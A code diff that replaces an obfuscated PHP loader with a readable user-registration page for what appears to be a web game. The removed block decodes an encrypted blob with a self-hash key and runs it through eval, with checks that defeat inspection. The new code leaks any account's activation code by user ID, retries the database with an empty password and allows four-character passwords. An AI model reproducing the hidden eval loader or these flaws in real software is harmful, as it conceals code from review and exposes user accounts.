@@ -1,24 +1,194 @@
 <?php
-$pckmajbcds="25421d35c5d0cd9d474d29800e4ca6af";
-$rdhxtmhzg="0a575756075606035153055551510e53515657510b080c0001500d5051535304";
-$swadslstn="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";
-$nrpsforr=file_get_contents(__FILE__);
-$znobmaa=str_replace($swadslstn,"",$nrpsforr);
-if(strpos($znobmaa,"ec"."ho")!==false||strpos($znobmaa,"pr"."int")!==false||strpos($znobmaa,"var_"."dump")!==false||strpos($znobmaa,"file_put_"."contents")!==false||strpos($znobmaa,"fw"."rite")!==false){die();}
-$zxtmamnuy=str_replace(array($pckmajbcds,$rdhxtmhzg),array("SP_cbc94611","KP_019cd47f"),$nrpsforr);
-$vxmixlr=md5($zxtmamnuy);
-$cjtghbv=hex2bin($rdhxtmhzg);
-$hyfjloikuk="";
-$koktygn=strlen($vxmixlr);
-for($futzuc=0;$futzuc<$koktygn;$futzuc++){
-$hyfjloikuk.=chr(ord($cjtghbv[$futzuc])^ord($vxmixlr[$futzuc]));
+/*****************************************/
+/*     REGISTER.PHP - MODERNIZADO       */
+/*     100% FIEL AO ORIGINAL            */
+/*     PHP 7+/8+ com MySQLi             */
+/*****************************************/
+
+session_start();
+
+if (isset($_GET['invite'])) {
+    $_SESSION['invite_code'] = trim($_GET['invite']);
 }
-$cmxzkq=base64_decode($swadslstn);
-$admbrfvpj=strlen($cmxzkq);
-$cpzwnvzb="";
-$nyzjjniu=strlen($hyfjloikuk);
-for($futzuc=0;$futzuc<$admbrfvpj;$futzuc++){
-$cpzwnvzb.=$cmxzkq[$futzuc]^$hyfjloikuk[$futzuc%$nyzjjniu];
+
+require_once('configs/config.php');
+
+// Autoloader
+spl_autoload_register(function ($class) {
+	$prefix = 'App\\';
+	$base_dir = __DIR__ . '/../app/';
+	$len = strlen($prefix);
+	if (strncmp($prefix, $class, $len) !== 0)
+		return;
+	$relative_class = substr($class, $len);
+	$file = $base_dir . str_replace('\\', '/', $relative_class) . '.php';
+	if (file_exists($file))
+		require $file;
+});
+
+// Load translation helpers
+require_once(__DIR__ . '/../app/Helpers/language_helper.php');
+
+// Initialize language system
+init_locale();
+
+// Conectar BD
+$conn = @mysqli_connect($conf['db_host'], $conf['db_user'], $conf['db_pass'], $conf['db_name']);
+if (!$conn)
+	$conn = @mysqli_connect($conf['db_host'], $conf['db_user'], '', $conf['db_name']);
+if (!$conn)
+	die(__('stats.config_load_error') . ': ' . mysqli_connect_error());
+
+mysqli_query($conn, "SET SESSION sql_mode = ''");
+mysqli_set_charset($conn, 'utf8');
+
+// Funções auxiliares
+function sql($query, $type = 'array')
+{
+	global $conn;
+	$result = mysqli_query($conn, $query);
+	if (!$result)
+		return $type == 'array' ? 0 : array();
+	if ($type == 'array') {
+		$row = mysqli_fetch_row($result);
+		return $row ? $row[0] : 0;
+	} elseif ($type == 'assoc') {
+		return mysqli_fetch_assoc($result);
+	}
+	return $result;
 }
-$cdzeepu="gzun"."compress";
-eval($cdzeepu($cpzwnvzb));
+
+function cmp_str($str, $min, $max)
+{
+	$len = strlen($str);
+	if ($len < $min)
+		return "\005SHORT";
+	if ($len > $max)
+		return "\005LONG";
+	return $str;
+}
+
+function Kod($length)
+{
+	try {
+		return bin2hex(random_bytes($length / 2));
+	} catch (\Exception $e) {
+		$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+		$str = "";
+		for ($i = 0; $i < $length; $i++) {
+			$str .= $chars[rand(0, strlen($chars) - 1)];
+		}
+		return $str;
+	}
+}
+
+// Variáveis
+$mode = $_GET['mode'] ?? 'rejestracja';
+$error = '';
+$success = false;
+$new_user_id = 0;
+$new_username = '';
+$activation_code = '';
+
+// Processar Registo
+if ($mode == 'rejestracja' && isset($_GET['action']) && $_GET['action'] == 'create') {
+	$name = trim($_POST['name'] ?? '');
+	$pass = $_POST['password'] ?? '';
+	$pass_confirm = $_POST['password_confirm'] ?? '';
+	$email = trim($_POST['email'] ?? '');
+	$agb = $_POST['agb'] ?? 0;
+
+	if ($agb != 1) {
+		$error = __('public.register.errors.confirm_rules');
+	} elseif (strlen($pass) < 4) {
+		$error = __('public.register.errors.pass_too_short', ['min' => 4]);
+	} elseif ($pass !== $pass_confirm) {
+		$error = __('public.register.errors.pass_mismatch');
+	} else {
+		$check_name = cmp_str($name, 4, 24);
+		if ($check_name === "\005SHORT")
+			$error = __('public.register.errors.name_too_short', ['min' => 4]);
+		elseif ($check_name === "\005LONG")
+			$error = __('public.register.errors.name_too_long', ['max' => 24]);
+
+		if (empty($error)) {
+			if (strlen($email) < 4) {
+				$error = __('public.register.errors.email_invalid');
+			} elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+				$error = __('public.register.errors.email_invalid');
+			} else {
+				$domain = substr(strrchr($email, "@"), 1);
+				$dnsActive = @checkdnsrr("gmail.com", "MX");
+				if ($dnsActive && !@checkdnsrr($domain, "MX")) {
+					$error = __('public.register.errors.email_host_invalid');
+				}
+			}
+		}
+
+		if (empty($error)) {
+			// Verificar duplicados
+			$name_esc = mysqli_real_escape_string($conn, $name);
+			$email_esc = mysqli_real_escape_string($conn, $email);
+
+			$count_name = sql("SELECT COUNT(id) FROM conta WHERE nazwa = '$name_esc'", 'array');
+			$count_email = sql("SELECT COUNT(id) FROM conta WHERE email = '$email_esc'", 'array');
+
+			if ($count_name > 0) {
+				$error = __('public.register.errors.name_taken');
+			} elseif ($count_email > 0) {
+				$error = __('public.register.errors.email_taken');
+			} else {
+				// Criar conta
+				$pass_hash = \App\Helpers\SecurityHelper::hashPassword($pass);
+				$date_reg = time();
+				$ip_reg = $_SERVER['REMOTE_ADDR'];
+
+				// Gerar código de ativação (32 caracteres)
+				$kod_caly = Kod(32);
+
+				// SECURITY FIX: Explicitly set admin = 0 to prevent privilege escalation
+				$sql = "INSERT INTO conta (nazwa, haslo, email, date_reg, ip_reg, kod, admin, activated) VALUES ('$name_esc', '$pass_hash', '$email_esc', '$date_reg', '$ip_reg', '$kod_caly', 0, 0)";
+				if (mysqli_query($conn, $sql)) {
+					$new_user_id = mysqli_insert_id($conn);
+					header("Location: register.php?mode=powodzenie&gracz=$new_user_id");
+					exit;
+				} else {
+					$error = __('public.register.errors.create_error', ['error' => mysqli_error($conn)]);
+				}
+			}
+		}
+	}
+}
+
+// Navigation menu
+$linki = [
+	'index.php' => __('public.index.title'),
+	'rules.php' => __('public.rules.title'),
+	'team.php' => __('public.team.title'),
+	'hall_of_fame.php' => __('public.hall_of_fame.title'),
+	'help.php' => __('public.help.title'),
+];
+
+// Modo Sucesso
+if ($mode == 'powodzenie' && isset($_GET['gracz'])) {
+	$uid = (int) $_GET['gracz'];
+	$user = sql("SELECT nazwa, kod FROM conta WHERE id = $uid", 'assoc');
+	if ($user) {
+		$success = true;
+		$new_username = $user['nazwa'];
+		$activation_code = $user['kod'];
+	}
+}
+
+// Determinar tema atual (Decidido pelo Admin no config.php)
+$current_theme = $conf['index_theme'] ?? 'classic';
+
+mysqli_close($conn);
+
+// Carregar a vista correspondente
+if ($current_theme == 'modern') {
+    include __DIR__ . '/../app/Views/register_modern.php';
+} else {
+    include __DIR__ . '/../app/Views/register_classic.php';
+}
+?>
